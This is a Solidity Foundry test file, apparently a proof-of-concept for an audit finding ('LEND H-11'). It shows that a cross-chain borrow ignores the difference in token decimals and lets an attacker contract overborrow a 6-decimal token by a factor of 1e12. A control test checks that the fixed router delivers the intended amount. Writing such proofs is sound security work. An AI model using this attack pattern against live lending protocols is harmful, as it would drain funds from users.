// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import {
    Exploit,
    Token,
    LErc20,
    CoreRouter,
    CoreRouterFixed
} from "./58380-h-11-users-will-lose-funds-due-to-token-decimal-mismatches.sol";

// LEND H-11: borrowForCrossChain transfers the source-chain amount unadjusted for
// the destination token's decimals. A 1_000-token borrow validated in 18-dec units
// (1_000e18) is transferred as raw units of a 6-dec destination token → the borrower
// receives 1e12x too much (a market-draining overborrow).
contract PoC_58380_LendDecimalMismatch is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant SRC_AMOUNT = 1_000 * 1e18; // validated on source (18-dec)
    uint256 internal constant INTENDED_DEST = 1_000 * 1e6; // intended on dest (6-dec)

    function test_attacker_overborrowsViaDecimalMismatch() public {
        Exploit exp = new Exploit();
        exp.run();

        Token usdc = exp.destUnderlying();
        uint256 received = usdc.balanceOf(address(exp)) + usdc.balanceOf(SINK);
        uint256 overborrow = usdc.balanceOf(SINK);

        emit log_named_uint("intended dest amount (1_000 USDC, 6-dec) ", INTENDED_DEST);
        emit log_named_uint("actually delivered (raw source units)    ", received);
        emit log_named_uint("overborrow routed to sink                ", overborrow);
        emit log_named_uint("overborrow factor (x)                    ", received / INTENDED_DEST);

        // The borrower received the 18-dec source amount as raw 6-dec units.
        assertEq(received, SRC_AMOUNT, "delivered != unadjusted source amount");
        // That is exactly 1e12x the intended 1_000 USDC.
        assertEq(received / INTENDED_DEST, 1e12, "overborrow factor != 10^(18-6)");
        // The overborrowed excess (everything above 1_000 USDC) was captured.
        assertEq(overborrow, SRC_AMOUNT - INTENDED_DEST, "captured excess mismatch");
    }

    // Control: decimal-normalized fixed router delivers exactly 1_000 USDC.
    function test_control_fixedNormalizesDecimals() public {
        Token usdc = new Token("USD Coin", "USDC", 6);
        LErc20 market = new LErc20(usdc);
        CoreRouterFixed core = new CoreRouterFixed();
        core.setCrossChainRouter(address(this));

        usdc.mint(address(market), SRC_AMOUNT * 2);

        address borrower = address(0xB0B);
        core.borrowForCrossChain(borrower, SRC_AMOUNT, address(market), address(usdc), 18, 6);

        emit log_named_uint("fixed delivered (6-dec units)", usdc.balanceOf(borrower));

        assertEq(usdc.balanceOf(borrower), INTENDED_DEST, "fixed must deliver exactly 1_000 USDC");
    }
}
